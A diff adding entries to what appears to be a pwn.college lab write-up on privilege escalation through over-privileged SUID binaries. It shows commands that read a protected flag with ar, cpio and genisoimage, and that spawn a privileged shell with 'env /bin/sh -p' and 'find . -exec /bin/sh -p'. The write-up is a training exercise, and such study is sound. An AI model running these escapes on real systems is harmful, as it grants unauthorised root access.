@@ -38,6 +38,8 @@ level 7-9: there're some tools  ----> over-privileged **editors**：**vim, emacs
 
 ![](img/pwn_college/level8/image-20221030103804124.png)
 
+**output**
+
 level 10：**rev**---> Used to output each line of a file in reverse order of characters, that is, the first character is last and the last character is first.
 
 level 11: **od**---> Octal, decimal, hex, ASCII dump
@@ -97,5 +99,44 @@ level 20: **tar**
 ```shell
 tar -cf flag.tar.gz flag  	#(-c:create new backup file -f:specify the backup file)
 cat flag.tar.gz
+```
+
+level 21: **ar** ---> to create or modify a backup file
+
+```shell
+ar rv flag.back flag
+cat flag.back
+```
+
+level 22: **cpio**--->used to backup file
+
+```shell
+cpio -o	回车	#-o Create the archive (run in copy-out mode)
+flag
+ctrl + D得到flag
+```
+
+level 23: **genisoimage**---> used to create an ISO 9660 image file, the output is placed inside the ISO9660 file system binary format.
+
+the file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.
+
+```shell
+genisoimage -sort flag
+```
+
+**execute other commands**
+
+It can be used to break out from restricted environments by spawning an interactive system shell
+
+level 24: **env**--->show environment variables that already exists in the system and executes instructions in the defined environment
+
+```shell
+env /bin/sh -p #getshell
+```
+
+level 25: **find**--->used to find files in the specified directory
+
+```shell
+find . -exec /bin/sh -p \;
 ```
 
